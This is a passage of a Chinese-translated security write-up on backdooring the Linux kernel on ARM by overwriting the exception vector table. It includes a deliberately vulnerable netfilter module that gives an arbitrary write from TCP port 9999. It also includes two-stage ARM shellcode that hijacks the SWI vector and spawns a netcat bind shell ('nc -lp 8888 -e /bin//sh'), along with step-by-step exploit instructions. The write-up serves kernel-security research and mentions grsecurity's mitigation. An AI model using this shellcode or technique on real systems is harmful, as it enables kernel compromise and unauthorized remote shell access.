    exit:
        ldr pc, [pc, #980] ;go to normal swi handler
您可以在[这里](https://github.com/acama/arm-evt/tree/master/local_example)找到易受攻击的模块和漏洞的完整代码。 运行漏洞利用：
## 远程环境
在这个例子中，我们将使用一个类似前一个漏洞的netfilter模块：
    if(ip->protocol == IPPROTO_TCP){
            tcp = (struct tcphdr *)(skb_network_header(skb) + ip_hdrlen(skb));
            currport = ntohs(tcp->dest);
            if((currport == 9999)){
                tcp_data = (char *)((unsigned char *)tcp + (tcp->doff * 4));
                where = ((void **)tcp_data)[0];
                len = ((uint8_t *)(tcp_data + sizeof(where)))[0];
                what = tcp_data + sizeof(where) + sizeof(len);
                memcpy(where, what, len);
            }
        }
就像前面的例子一样，这个模块有一个很棒的功能，可以让你将数据写到你想要的任何地方。 在端口tcp /
9999上连接，并给它一个地址，将后面跟着数据的大小和实际数据写在那里。  
在这种情况下，我们还会通过覆盖SWI异常向量并对内核进行后门来获取内核后门。
代码将执行到我们的shellcode，我们也将像前一个例子那样存储0xffff020。在这个远程场景中重写SWI向量尤其是一个好主意，因为它可以让我们从中断上下文切换到进程上下文。  
因此，我们的后门将在支持进程的上下文中执行，并“劫持”这个进程并用绑定shell或连接返回shell来覆盖它的代码段。 但我们不会这样做。
让我们快速检查一下：
你可以看到，EVT是一个共享内存段。
它可以从用户空间执行并从内核空间写入*。不要覆盖正在进行系统调用的进程的代码段，而只需在我们的第一阶段之后将代码存储在EVT中，然后返回即可。
每个系统调用都通过SWI向量，所以我们不必等待一个进程陷入陷阱。
### Exploit
利用步骤：
  1. 将我们的第一阶段和第二阶段shellcode存储在0xffff0020（一个接一个）。
  2. 用分支覆盖SWI异常向量0xffff0020。
  3. 发生系统调用时，我们的第一阶段shellcode会将链接寄存器设置为我们第二阶段shellcode的地址（它也存储在EVT中，并将从用户空间执行），然后返回到用户空间。
  4. 调用进程将在我们第二阶段的地址“恢复执行”，这只是一个绑定shell。
下面是第一、二阶段shellcode:
    stage_1:
        adr lr, stage_2
        push {lr}
        stmfd sp!, {r0-r12}
        ldr r0, =0xe59ff410 ; intial value at 0xffff0008 which is
                                    ; ldr pc, [pc, #1040] ; 0xffff0420
        ldr r1, =0xffff0008
        str r0, [r1]
        ldmfd sp!, {r0-r12, pc}^ ; return to userland
    stage_2:
        ldr r0, =0x6e69622f ; /bin
        ldr r1, =0x68732f2f ; /sh
        eor r2, r2, r2 ; 0x00000000
        push {r0, r1, r2}
        mov r0, sp
        ldr r4, =0x0000632d ; -c\x00\x00
        push {r4}
        mov r4, sp
        ldr r5, =0x2d20636e
        ldr r6, =0x3820706c
        ldr r7, =0x20383838 ; nc -lp 8888 -e /bin//sh
        ldr r8, =0x2f20652d
        ldr r9, =0x2f6e6962
        ldr r10, =0x68732f2f
        eor r11, r11, r11
        push {r5-r11}
        mov r5, sp
        push {r2}
        eor r6, r6, r6
        push {r0,r4,r5, r6}
        mov r1, sp
        mov r7, #11
        swi 0x0
        mov r0, #99
        mov r7, #1
        swi 0x0
您可以在[这里](https://github.com/acama/arm-evt/tree/master/remote_example)找到易受攻击的模块和漏洞的完整代码。 运行漏洞利用：
# 奖励：中断堆栈溢出
在大多数内存布局中，中断堆栈似乎与EVT相邻。谁知道如果有堆栈溢出之类的事情会发生什么样的有趣事情？
# 关于
  * 本文中讨论的技术假设攻击已经知道内核地址，而这可能并非总是如此。
  * 我们存储shellcode（0xffff0020）的位置可能会或可能不会被其他发行版的内核使用。
  * 我在这里写的实验代码仅仅是PoC; 他们肯定可以改进。 例如，在远程方案中，如果事实证明init进程是被劫持的进程，则在我们退出绑定shell之后，该方框会崩溃。
  * 如果您没有注意到，这里提到的“漏洞”并不是真正的漏洞，但这不是本文的重点。
*EVT似乎可以映射为只读，因此可能无法在较新/某些版本的Linux内核中写入。
# 最后的话
除此之外，[grsec](http://grsecurity.net/)通过设置页面为只读来防止修改EVT。
如果你想玩一些有趣的内核挑战，请查看[w3challs](http://w3challs.com/challenges/wargame)上的“kernelpanic”分支。  
Cheers，[@amatcama](https://twitter.com/amatcama)
# 参考
[1] [Vector Rewrite Attack](https://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf)  
[2] [Recent ARM Security
Improvements](https://forums.grsecurity.net/viewtopic.php?f=7&t=3292)  
[3] [Entering an
Exception](http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0311d/I30195.html)  
[4] [SWI
handlers](http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0040d/Cacdfeci.html)  
[5] [ARM
Exceptions](http://osnet.cs.nchu.edu.tw/powpoint/Embedded94_1/Chapter%207%20ARM%20Exceptions.pdf)  
[6] [Exception and Interrupt Handling in ARM](http://www.iti.uni-stuttgart.de/~radetzki/Seminar06/08_report.pdf)